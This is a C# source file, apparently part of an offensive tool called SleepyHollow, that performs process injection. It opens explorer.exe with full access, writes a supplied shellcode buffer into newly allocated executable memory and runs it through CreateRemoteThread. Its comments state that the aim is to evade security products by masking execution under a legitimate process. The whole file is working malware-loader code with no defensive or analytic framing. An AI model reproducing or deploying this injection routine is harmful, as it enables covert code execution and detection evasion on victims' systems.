using System.Diagnostics;

namespace SleepyHollow;

/// <summary>
/// This class is used to open a running process and run code in its context.<br/>
/// Technique is called "Process Injection" and is a method of executing arbitrary code in the address space of a separate live process. <br/>
/// Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. <br/>
/// Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.<br/>
/// </summary>
internal static class InjectProcess
{
    internal static Task Run(byte[] buf, string processName = "explorer")
    {
        var pid = Process.GetProcessesByName(processName)[0].Id;
        var hProcess = Lib.OpenProcess(OpenProcessFlags.PROCESS_ALL_ACCESS, false, pid);
        IntPtr lpAddress = Lib.VirtualAllocExNuma(hProcess, IntPtr.Zero, 0x1000, Lib.MEM_COMMIT_AND_RESERVE, Lib.PAGE_EXECUTE_READWRITE, 0);
        Lib.WriteProcessMemory(hProcess, lpAddress, buf, buf.Length, out IntPtr lpNumberOfBytesWritten);
        Console.WriteLine("Bytes written to process memory: " + lpNumberOfBytesWritten);
        IntPtr hThread = Lib.CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpAddress, IntPtr.Zero, 0, IntPtr.Zero);
        Console.WriteLine($"Thread creation successful - Thread handle: 0x{hThread:x8}");
        Lib.WaitForSingleObject(hThread, 0xFFFFFFFF);
        return Task.CompletedTask;
    }
}